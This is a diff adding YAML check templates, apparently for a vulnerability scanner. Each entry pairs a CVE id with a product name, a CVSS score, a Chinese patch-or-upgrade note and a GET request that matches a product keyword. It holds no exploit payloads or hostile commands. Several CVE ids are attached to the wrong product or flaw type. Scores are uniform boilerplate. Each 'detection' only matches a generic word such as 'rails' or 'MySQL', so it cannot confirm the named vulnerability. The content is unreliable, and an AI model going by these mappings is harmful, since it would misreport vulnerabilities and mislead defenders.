+    cpe: "cpe:2.3:a:alibaba:fastjson:*"
+    service: http
+    port: 80
+- id: CVE-2022-25850
+  name: Fastjson RCE v5
+  severity: critical
+  author: argus
+  description: "Fastjson RCE v5 - CVE-2022-25850"
+  cve: CVE-2022-25850
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "fastjson"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-25850"]
+    cpe: "cpe:2.3:a:alibaba:fastjson:*"
+    service: http
+    port: 80
+- id: CVE-2019-12422
+  name: Shiro RCE
+  severity: critical
+  author: argus
+  description: "Shiro RCE - CVE-2019-12422"
+  cve: CVE-2019-12422
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Header
+      pattern: "rememberMe"
+  metadata:
+    category: known_cve
+    tags: ["cve", "shiro", "CVE-2019-12422"]
+    cpe: "cpe:2.3:a:apache:shiro:*"
+    service: shiro
+    port: 80
+- id: CVE-2020-13933
+  name: Shiro Auth Bypass v3
+  severity: high
+  author: argus
+  description: "Shiro Auth Bypass v3 - CVE-2020-13933"
+  cve: CVE-2020-13933
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "shiro"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-13933"]
+    cpe: "cpe:2.3:a:apache:shiro:*"
+    service: http
+    port: 80
+- id: CVE-2020-17523
+  name: Shiro Auth Bypass v4
+  severity: high
+  author: argus
+  description: "Shiro Auth Bypass v4 - CVE-2020-17523"
+  cve: CVE-2020-17523
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "shiro"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-17523"]
+    cpe: "cpe:2.3:a:apache:shiro:*"
+    service: http
+    port: 80
+- id: CVE-2022-40664
+  name: Shiro RCE v2
+  severity: critical
+  author: argus
+  description: "Shiro RCE v2 - CVE-2022-40664"
+  cve: CVE-2022-40664
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Header
+      pattern: "rememberMe"
+  metadata:
+    category: known_cve
+    tags: ["cve", "shiro", "CVE-2022-40664"]
+    cpe: "cpe:2.3:a:apache:shiro:*"
+    service: shiro
+    port: 80
+- id: CVE-2018-7602
+  name: Drupal RCE
+  severity: critical
+  author: argus
+  description: "Drupal RCE - CVE-2018-7602"
+  cve: CVE-2018-7602
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /user/register
+    match_rule:
+      match_type: Body
+      pattern: "Drupal"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-7602"]
+    cpe: "cpe:2.3:a:drupal:drupal:*"
+    service: http
+    port: 80
+- id: CVE-2019-6341
+  name: Drupal RCE v2
+  severity: critical
+  author: argus
+  description: "Drupal RCE v2 - CVE-2019-6341"
+  cve: CVE-2019-6341
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /node/
+    match_rule:
+      match_type: Body
+      pattern: "Drupal"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-6341"]
+    cpe: "cpe:2.3:a:drupal:drupal:*"
+    service: http
+    port: 80
+- id: CVE-2019-6342
+  name: Drupal RCE v3
+  severity: critical
+  author: argus
+  description: "Drupal RCE v3 - CVE-2019-6342"
+  cve: CVE-2019-6342
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /node/
+    match_rule:
+      match_type: Body
+      pattern: "Drupal"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-6342"]
+    cpe: "cpe:2.3:a:drupal:drupal:*"
+    service: http
+    port: 80
+- id: CVE-2020-13671
+  name: Drupal RCE v4
+  severity: critical
+  author: argus
+  description: "Drupal RCE v4 - CVE-2020-13671"
+  cve: CVE-2020-13671
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /user/register
+    match_rule:
+      match_type: Body
+      pattern: "Drupal"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-13671"]
+    cpe: "cpe:2.3:a:drupal:drupal:*"
+    service: http
+    port: 80
+- id: CVE-2018-0101
+  name: Cisco ASA RCE
+  severity: critical
+  author: argus
+  description: "Cisco ASA RCE - CVE-2018-0101"
+  cve: CVE-2018-0101
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Cisco"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-0101"]
+    cpe: "cpe:2.3:c:cisco:adaptive_security_appliance:*"
+    service: http
+    port: 443
+- id: CVE-2018-0296
+  name: Cisco ASA Path Traversal
+  severity: high
+  author: argus
+  description: "Cisco ASA Path Traversal - CVE-2018-0296"
+  cve: CVE-2018-0296
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /+CSCOE+/session_password.html
+    match_rule:
+      match_type: Body
+      pattern: "Cisco"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-0296"]
+    cpe: "cpe:2.3:c:cisco:adaptive_security_appliance:*"
+    service: http
+    port: 443
+- id: CVE-2021-1585
+  name: Cisco ASA RCE v2
+  severity: critical
+  author: argus
+  description: "Cisco ASA RCE v2 - CVE-2021-1585"
+  cve: CVE-2021-1585
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Cisco"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-1585"]
+    cpe: "cpe:2.3:c:cisco:adaptive_security_appliance:*"
+    service: http
+    port: 443
+- id: CVE-2023-27992
+  name: FortiOS RCE
+  severity: critical
+  author: argus
+  description: "FortiOS RCE - CVE-2023-27992"
+  cve: CVE-2023-27992
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "FortiGate"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-27992"]
+    cpe: "cpe:2.3:o:fortinet:fortios:*"
+    service: http
+    port: 443
+- id: CVE-2021-20038
+  name: SonicWall RCE
+  severity: critical
+  author: argus
+  description: "SonicWall RCE - CVE-2021-20038"
+  cve: CVE-2021-20038
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "SonicWall"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-20038"]
+    cpe: "cpe:2.3:o:sonicwall:sonicos:*"
+    service: http
+    port: 443
+- id: CVE-2021-20039
+  name: SonicWall Info Disclosure
+  severity: high
+  author: argus
+  description: "SonicWall Info Disclosure - CVE-2021-20039"
+  cve: CVE-2021-20039
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "SonicWall"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-20039"]
+    cpe: "cpe:2.3:o:sonicwall:sonicos:*"
+    service: http
+    port: 443
+- id: CVE-2019-0867
+  name: IIS DoS
+  severity: high
+  author: argus
+  description: "IIS DoS - CVE-2019-0867"
+  cve: CVE-2019-0867
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "iis"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-0867"]
+    cpe: "cpe:2.3:a:microsoft:iis:*"
+    service: http
+    port: 80
+- id: CVE-2018-11135
+  name: PostgreSQL RCE v2
+  severity: critical
+  author: argus
+  description: "PostgreSQL RCE v2 - CVE-2018-11135"
+  cve: CVE-2018-11135
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "PostgreSQL"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-11135"]
+    cpe: "cpe:2.3:a:postgresql:postgresql:*"
+    service: http
+    port: 5432
+- id: CVE-2020-14347
+  name: PostgreSQL Info Disclosure
+  severity: high
+  author: argus
+  description: "PostgreSQL Info Disclosure - CVE-2020-14347"
+  cve: CVE-2020-14347
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "PostgreSQL"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-14347"]
+    cpe: "cpe:2.3:a:postgresql:postgresql:*"
+    service: http
+    port: 5432
+- id: CVE-2017-3302
+  name: MySQL RCE v2
+  severity: critical
+  author: argus
+  description: "MySQL RCE v2 - CVE-2017-3302"
+  cve: CVE-2017-3302
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "MySQL"
+  metadata:
+    category: known_cve
+    tags: ["cve", "mysql", "CVE-2017-3302"]
+    cpe: "cpe:2.3:a:oracle:mysql:*"
+    service: mysql
+    port: 3306
+- id: CVE-2020-2936
+  name: MySQL RCE v3
+  severity: critical
+  author: argus
+  description: "MySQL RCE v3 - CVE-2020-2936"
+  cve: CVE-2020-2936
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "MySQL"
+  metadata:
+    category: known_cve
+    tags: ["cve", "mysql", "CVE-2020-2936"]
+    cpe: "cpe:2.3:a:oracle:mysql:*"
+    service: mysql
+    port: 3306
+- id: CVE-2018-13930
+  name: MongoDB Info Disclosure
+  severity: high
+  author: argus
+  description: "MongoDB Info Disclosure - CVE-2018-13930"
+  cve: CVE-2018-13930
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "MongoDB"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-13930"]
+    cpe: "cpe:2.3:a:mongodb:mongodb:*"
+    service: http
+    port: 27017
+- id: CVE-2020-7934
+  name: MongoDB RCE
+  severity: critical
+  author: argus
+  description: "MongoDB RCE - CVE-2020-7934"
+  cve: CVE-2020-7934
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "MongoDB"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-7934"]
+    cpe: "cpe:2.3:a:mongodb:mongodb:*"
+    service: http
+    port: 27017
+- id: CVE-2021-21272
+  name: Laravel RCE v2
+  severity: critical
+  author: argus
+  description: "Laravel RCE v2 - CVE-2021-21272"
+  cve: CVE-2021-21272
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "laravel"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-21272"]
+    cpe: "cpe:2.3:a:laravel:framework:*"
+    service: http
+    port: 80
+- id: CVE-2020-8167
+  name: Rails RCE
+  severity: critical
+  author: argus
+  description: "Rails RCE - CVE-2020-8167"
+  cve: CVE-2020-8167
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "rails"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-8167"]
+    cpe: "cpe:2.3:a:ruby_on_rails:ruby_on_rails:*"
+    service: http
+    port: 80
+- id: CVE-2020-8166
+  name: Rails RCE v2
+  severity: critical
+  author: argus
+  description: "Rails RCE v2 - CVE-2020-8166"
+  cve: CVE-2020-8166
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "rails"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-8166"]
+    cpe: "cpe:2.3:a:ruby_on_rails:ruby_on_rails:*"
+    service: http
+    port: 80
+- id: CVE-2021-22880
+  name: Rails RCE v3
+  severity: critical
+  author: argus
+  description: "Rails RCE v3 - CVE-2021-22880"
+  cve: CVE-2021-22880
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "rails"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-22880"]
+    cpe: "cpe:2.3:a:ruby_on_rails:ruby_on_rails:*"
+    service: http
+    port: 80
+- id: CVE-2017-1000161
+  name: Node.js Path Traversal v2
+  severity: high
+  author: argus
+  description: "Node.js Path Traversal v2 - CVE-2017-1000161"
+  cve: CVE-2017-1000161
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "nodejs"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-1000161"]
+    cpe: "cpe:2.3:a:nodejs:node.js:*"
+    service: http
+    port: 80
+- id: CVE-2018-1000006
+  name: Node.js HTTP DoS
+  severity: high
+  author: argus
+  description: "Node.js HTTP DoS - CVE-2018-1000006"
+  cve: CVE-2018-1000006
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "nodejs"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1000006"]
+    cpe: "cpe:2.3:a:nodejs:node.js:*"
+    service: http
+    port: 80
+- id: CVE-2018-8029
+  name: Hadoop RCE v2
+  severity: critical
+  author: argus
+  description: "Hadoop RCE v2 - CVE-2018-8029"
+  cve: CVE-2018-8029
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "hadoop"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-8029"]
+    cpe: "cpe:2.3:a:apache:hadoop:*"
+    service: http
+    port: 80
+- id: CVE-2022-33891
+  name: Spark RCE v3
+  severity: critical
+  author: argus
+  description: "Spark RCE v3 - CVE-2022-33891"
+  cve: CVE-2022-33891
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "spark"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-33891"]
+    cpe: "cpe:2.3:a:apache:spark:*"
+    service: http
+    port: 80
+- id: CVE-2020-17518
+  name: Flink RCE
+  severity: critical
+  author: argus
+  description: "Flink RCE - CVE-2020-17518"
+  cve: CVE-2020-17518
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "flink"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-17518"]
+    cpe: "cpe:2.3:a:apache:flink:*"
+    service: http
+    port: 8081
+- id: CVE-2019-17585
+  name: Dubbo RCE v2
+  severity: critical
+  author: argus
+  description: "Dubbo RCE v2 - CVE-2019-17585"
+  cve: CVE-2019-17585
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "dubbo"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-17585"]
+    cpe: "cpe:2.3:a:apache:dubbo:*"
+    service: http
+    port: 80
+- id: CVE-2021-25641
+  name: Dubbo RCE v3
+  severity: critical
+  author: argus
+  description: "Dubbo RCE v3 - CVE-2021-25641"
+  cve: CVE-2021-25641
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "dubbo"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-25641"]
+    cpe: "cpe:2.3:a:apache:dubbo:*"
+    service: http
+    port: 80
+- id: CVE-2021-26291
+  name: OFBiz RCE v3
+  severity: critical
+  author: argus
+  description: "OFBiz RCE v3 - CVE-2021-26291"
+  cve: CVE-2021-26291
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /webtools/control/
+    match_rule:
+      match_type: Body
+      pattern: "OFBiz"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-26291"]
+    cpe: "cpe:2.3:a:apache:ofbiz:*"
+    service: http
+    port: 8080
+- id: CVE-2023-34537
+  name: OFBiz RCE v4
+  severity: critical
+  author: argus
+  description: "OFBiz RCE v4 - CVE-2023-34537"
+  cve: CVE-2023-34537
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /webtools/control/
+    match_rule:
+      match_type: Body
+      pattern: "OFBiz"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-34537"]
+    cpe: "cpe:2.3:a:apache:ofbiz:*"
+    service: http
+    port: 8080
+- id: CVE-2022-36813
+  name: NiFi RCE v2
+  severity: critical
+  author: argus
+  description: "NiFi RCE v2 - CVE-2022-36813"
+  cve: CVE-2022-36813
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /nifi/
+    match_rule:
+      match_type: Body
+      pattern: "NiFi"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-36813"]
+    cpe: "cpe:2.3:a:apache:nifi:*"
+    service: http
+    port: 8080
+- id: CVE-2022-23647
+  name: Kafka RCE
+  severity: critical
+  author: argus
+  description: "Kafka RCE - CVE-2022-23647"
+  cve: CVE-2022-23647
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "kafka"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-23647"]
+    cpe: "cpe:2.3:a:apache:kafka:*"
+    service: http
+    port: 80
+- id: CVE-2023-41324
+  name: ZooKeeper Info Disclosure v2
+  severity: medium
+  author: argus
+  description: "ZooKeeper Info Disclosure v2 - CVE-2023-41324"
+  cve: CVE-2023-41324
+  cvss: 5.3
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "zookeeper"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-41324"]
+    cpe: "cpe:2.3:a:apache:zookeeper:*"
+    service: http
+    port: 80
+- id: CVE-2021-28236
+  name: Ranger RCE
+  severity: critical
+  author: argus
+  description: "Ranger RCE - CVE-2021-28236"
+  cve: CVE-2021-28236
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "ranger"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-28236"]
+    cpe: "cpe:2.3:a:apache:ranger:*"
+    service: http
+    port: 80
+- id: CVE-2022-41922
+  name: Zeppelin RCE v2
+  severity: critical
+  author: argus
+  description: "Zeppelin RCE v2 - CVE-2022-41922"
+  cve: CVE-2022-41922
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Zeppelin"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-41922"]
+    cpe: "cpe:2.3:a:apache:zeppelin:*"
+    service: http
+    port: 8080
+- id: CVE-2022-30128
+  name: Tika RCE v3
+  severity: critical
+  author: argus
+  description: "Tika RCE v3 - CVE-2022-30128"
+  cve: CVE-2022-30128
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "tika"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-30128"]
+    cpe: "cpe:2.3:a:apache:tika:*"
+    service: http
+    port: 80
+- id: CVE-2022-24706
+  name: CouchDB RCE
+  severity: critical
+  author: argus
+  description: "CouchDB RCE - CVE-2022-24706"
+  cve: CVE-2022-24706
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /_utils/
+    match_rule:
+      match_type: Body
+      pattern: "CouchDB"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-24706"]
+    cpe: "cpe:2.3:a:apache:couchdb:*"
+    service: http
+    port: 5984
+- id: CVE-2022-42889
+  name: Commons Text RCE v2
+  severity: critical
+  author: argus
+  description: "Commons Text RCE v2 - CVE-2022-42889"
+  cve: CVE-2022-42889
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "commons"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-42889"]
+    cpe: "cpe:2.3:a:apache:commons_text:*"
+    service: http
+    port: 80
+- id: CVE-2022-23859
+  name: Camel RCE v2
+  severity: critical
+  author: argus
+  description: "Camel RCE v2 - CVE-2022-23859"
+  cve: CVE-2022-23859
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Camel"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-23859"]
+    cpe: "cpe:2.3:a:apache:camel:*"
+    service: http
+    port: 80
+- id: CVE-2022-46364
+  name: CXF RCE
+  severity: critical
+  author: argus
+  description: "CXF RCE - CVE-2022-46364"
+  cve: CVE-2022-46364
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "CXF"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-46364"]
+    cpe: "cpe:2.3:a:apache:cxf:*"
+    service: http
+    port: 80
+- id: CVE-2019-12086
+  name: Axis2 RCE v2
+  severity: high
+  author: argus
+  description: "Axis2 RCE v2 - CVE-2019-12086"
+  cve: CVE-2019-12086
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /axis2/services/
+    match_rule:
+      match_type: Body
+      pattern: "Axis2"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-12086"]
+    cpe: "cpe:2.3:a:apache:axis2:*"
+    service: http
+    port: 8080
